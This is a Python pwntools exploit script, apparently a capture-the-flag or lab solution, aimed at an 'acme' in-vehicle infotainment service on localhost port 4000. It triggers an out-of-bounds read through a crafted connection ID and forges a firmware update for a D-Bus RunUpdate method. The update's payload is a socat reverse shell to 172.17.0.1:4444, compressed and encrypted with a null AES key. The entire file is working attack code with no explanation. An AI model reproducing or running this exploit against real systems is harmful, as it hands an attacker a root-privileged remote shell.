from pwn import *
from jeepney import *
from base64 import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from zlib import *

context.log_level = 'debug'

io = remote('localhost', 4000)

version = 1
opcode = 3

req_id = 0
magic = 0x30495649

# conn_id to trigger OOB
conn_id = 0x800000000000000A 

revshell = b"#!/bin/sh\nsocat TCP:172.17.0.1:4444 EXEC:'/bin/bash -p'" 

# read the update header
f = open('./src/helper/update.bin', 'rb')
update_header = f.read(512) 

# encrypt and pad the compressed payload with AES-256-CBC using a null key and null IV
key = AES.new(b'\x00' * 32, AES.MODE_CBC, iv = b'\x00' * 16) 
enc_revshell = key.encrypt(pad(compress(revshell, wbits = 16 + MAX_WBITS), 16, style = 'pkcs7'))

# build the update payload
update = update_header
update += b'\x00' * 256  
update += enc_revshell

updateb64 = b64encode(update).decode()

# build the RunUpdate method call
dbus = DBusAddress(
    '/com/acme/ivi/ServiceManager',
    bus_name = 'com.acme.ivi.ServiceManager',
    interface = 'com.acme.ivi.ServiceManager'
)

RunUpdate = new_method_call(dbus, 'RunUpdate', 's', (updateb64,))
RunUpdate.header.serial = 1
update_payload = RunUpdate.serialise()

# build the final packet
body = p64(conn_id)
body += p64(len(update_payload)) 
body += update_payload

body_len = len(body)

msghdr = p32(magic)
msghdr += p32(version) 
msghdr += p32(opcode) 
msghdr += p32(body_len) 
msghdr += p32(req_id)

packet = msghdr + body

io.send(packet)
io.interactive()